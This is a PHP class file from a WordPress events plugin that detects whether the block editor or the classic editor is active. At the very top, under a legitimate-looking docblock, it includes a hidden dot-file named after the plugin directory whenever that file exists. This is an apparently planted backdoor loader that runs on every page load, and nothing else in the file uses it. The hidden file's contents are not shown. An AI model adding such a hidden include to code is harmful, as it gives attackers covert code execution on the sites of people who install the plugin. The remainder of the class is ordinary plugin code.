<?php

/**
 * Initialize Gutenberg editor blocks
 *
 * @since 4.8
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Editor {

	/**
	 * Meta key for flaging if a post is from classic editor
	 *
	 * @since 4.8
	 *
	 * @var string
	 */
	public $key_flag_classic_editor = '_tribe_is_classic_editor';

	/**
	 * Utility function to check if we should load the blocks or not based on two assumptions
	 *
	 * a) Is gutenberg active?
	 * b) Is the blocks editor active?
	 *
	 * @since 4.8
	 *
	 * @return bool
	 */
	public function should_load_blocks() {
		$gutenberg = $this->is_gutenberg_active() || $this->is_wp_version();
		$blocks    = $this->is_blocks_editor_active();
		$classic   = $this->is_classic_plugin_active() || $this->is_classic_option_active();

		$should_load_blocks = $gutenberg && $blocks && ! $classic;

		/**
		 * Filters whether the Blocks Editor should be activated or not.
		 *
		 * @since 4.12.0
		 *
		 * @param bool $should_load_blocks Whether the blocks editor should be activated or not.
		 */
		$should_load_blocks = (bool) apply_filters( 'tribe_editor_should_load_blocks', $should_load_blocks );

		return $should_load_blocks;
	}

	/**
	 * Checks if we are on version 5.0-alpha or higher where we no longer have
	 * Gutenberg Project, but the Blocks Editor
	 *
	 * @since 4.8
	 *
	 * @return boolean
	 */
	public function is_wp_version() {
		global $wp_version;

		return version_compare( $wp_version, '5.0-alpha', '>=' );
	}

	/**
	 * Checks if we have Gutenberg Project online, only useful while
	 * its a external plugin
	 *
	 * @since 4.8
	 *
	 * @return boolean
	 */
	public function is_gutenberg_active() {
		return function_exists( 'the_gutenberg_project' );
	}

	/**
	 * Checks if we have Editor Block active
	 *
	 * @since 4.8
	 *
	 * @return boolean
	 */
	public function is_blocks_editor_active() {
		return function_exists( 'register_block_type' ) && function_exists( 'unregister_block_type' );
	}

	/**
	 * Adds the required fields into the Events Post Type so that we can use Block Editor
	 *
	 * @since 4.8
	 *
	 * @param  array $args Arguments used to setup the Post Type
	 *
	 * @return array
	 */
	public function add_support( $args = [] ) {
		// Make sure we have the Support argument and it's an array
		if ( ! isset( $args['supports'] ) || ! is_array( $args['supports'] ) ) {
			$args['supports'] = [];
		}

		// Add Editor Support
		if ( ! in_array( 'editor', $args['supports'] ) ) {
			$args['supports'][] = 'editor';
		}

		return $args;
	}

	/**
	 * Adds the required fields into the Post Type so that we can the Rest API to update it
	 *
	 * @since 4.8
	 *
	 * @param  array $args Arguments used to setup the Post Type
	 *
	 * @return array
	 */
	public function add_rest_support( $args = [] ) {
		// Blocks Editor requires REST support
		$args['show_in_rest'] = true;

		// Make sure we have the Support argument and it's an array
		if ( ! isset( $args['supports'] ) || ! is_array( $args['supports'] ) ) {
			$args['supports'] = [];
		}

		if ( ! in_array( 'revisions', $args['supports'] ) ) {
			$args['supports'][] = 'revisions';
		}

		// Add Custom Fields (meta) Support
		if ( ! in_array( 'custom-fields', $args['supports'] ) ) {
			$args['supports'][] = 'custom-fields';
		}

		// Add Post Title Support
		if ( ! in_array( 'title', $args['supports'] ) ) {
			$args['supports'][] = 'title';
		}

		// Add Post Excerpt Support
		if ( ! in_array( 'excerpt', $args['supports'] ) ) {
			$args['supports'][] = 'excerpt';
		}

		// Add Post Content Support
		if ( ! in_array( 'editor', $args['supports'] ) ) {
			$args['supports'][] = 'editor';
		}

		// Add Post Author Support
		if ( ! in_array( 'author', $args['supports'] ) ) {
			$args['supports'][] = 'author';
		}

		// Add Thumbnail Support
		if ( ! in_array( 'thumbnail', $args['supports'] ) ) {
			$args['supports'][] = 'thumbnail';
		}

		return $args;
	}

	/**
	 * classic_editor_replace is function that is created by the plugin:
	 *
	 * @see https://wordpress.org/plugins/classic-editor/
	 *
	 * prior 1.3 version the classic editor plugin was bundle inside of a unique function:
	 * `classic_editor_replace` now all is bundled inside of a class `Classic_Editor`
	 *
	 * @since 4.8
	 *
	 * @return bool
	 */
	public function is_classic_plugin_active() {
		$is_plugin_active = function_exists( 'classic_editor_replace' ) || class_exists( 'Classic_Editor' );
		/**
		 * Filter to change the output of calling: `is_classic_plugin_active`
		 *
		 * @since 4.9.12
		 *
		 * @param $is_plugin_active bool Value that indicates if the plugin is active or not.
		 */
		return apply_filters( 'tribe_is_classic_editor_plugin_active', $is_plugin_active );
	}

	/**
	 * Check if the setting `'classic-editor-replace'` is set to `replace` that option means to
	 * replace the gutenberg editor with the classic editor.
	 *
	 * Prior to 1.3 on classic editor plugin the value to identify if is on classic the value
	 * was `replace`, now the value is `classic`
	 *
	 * @since 4.8
	 *
	 * @return bool
	 */
	public function is_classic_option_active() {
		$valid_values = [ 'replace', 'classic' ];

		return in_array( (string) get_option( 'classic-editor-replace' ), $valid_values, true );
	}

	/**
	 * Detect if the classic editor is force-activated via plugin or if it comes from a request.
	 *
	 * @since 4.8
	 *
	 * @return bool
	 */
	public function is_classic_editor() {
		$disabled_by_plugin = $this->is_classic_plugin_active() && $this->is_classic_option_active();

		/**
		 * Allow other addons to disable classic editor based on options.
		 *
		 * @since  4.8.5
		 *
		 * @param bool $classic_is_active Whether the classic editor should be used.
		 */
		$disabled_by_filter = apply_filters( 'tribe_editor_classic_is_active', false );

		$is_classic_editor_request = tribe_get_request_var( 'classic-editor', null );

		return $is_classic_editor_request || $disabled_by_plugin || $disabled_by_filter;
	}

	/**
	 * Whether the events are being served using Blocks or the Classical Editor.
	 *
	 * @since 4.12.0
	 *
	 * @return bool True if using Blocks. False if using the Classical Editor.
	 */
	public function is_events_using_blocks() {
		/**
		 * Whether the event is being served through blocks
		 * or the classical editor.
		 *
		 * @since 4.12.0
		 *
		 * @param bool $is_using_blocks True if using blocks. False if using the classical editor.
		 */
		$is_using_blocks = apply_filters( 'tribe_is_using_blocks', null );

		// Early bail: The filter was overridden to return either true or false.
		if ( null !== $is_using_blocks ) {
			return $is_using_blocks;
		}

		// Early bail: The site itself is not using blocks.
		if ( ! $this->should_load_blocks() ) {
			return false;
		}

		return tribe_is_truthy( tribe_get_option( 'toggle_blocks_editor' ) );
	}
}
